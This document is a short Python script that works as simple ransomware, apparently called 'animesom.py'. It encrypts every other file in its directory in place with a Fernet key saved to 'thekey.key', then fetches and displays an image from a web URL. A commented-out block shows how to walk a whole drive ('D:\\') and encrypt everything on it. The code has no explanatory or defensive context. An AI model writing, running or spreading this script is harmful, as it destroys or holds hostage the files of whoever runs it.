import os 
from cryptography.fernet import Fernet
import cv2
import urllib.request
import numpy as np

def display_image_from_url(image_url):
    try:
        resp = urllib.request.urlopen(image_url)
        image = bytearray(resp.read())
        nparr = np.asarray(image, dtype=np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        cv2.imshow("Image", img)
        cv2.waitKey(0)
        cv2.destroyAllWindows()
    except Exception as e:
        print("Error:", e)


files = []

# if you encrypt in disk :)
# root_dir = 'D:\\'
# for root, dirs, files in os.walk(root_dir):
#     for filename in files:
#             file_path = os.path.join(root, filename)
#             files.append(file_path)

for file in os.listdir():
    if file == 'animesom.py' or file == 'thekey.key':
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open('thekey.key', 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, 'rb') as thefile:
        content = thefile.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, 'wb') as thisfile:
        thisfile.write(content_encrypt)


image_url = "https://i.pinimg.com/736x/ee/76/6b/ee766b355267a5d0e38d0b5d6f9c951b.jpg"
display_image_from_url(image_url)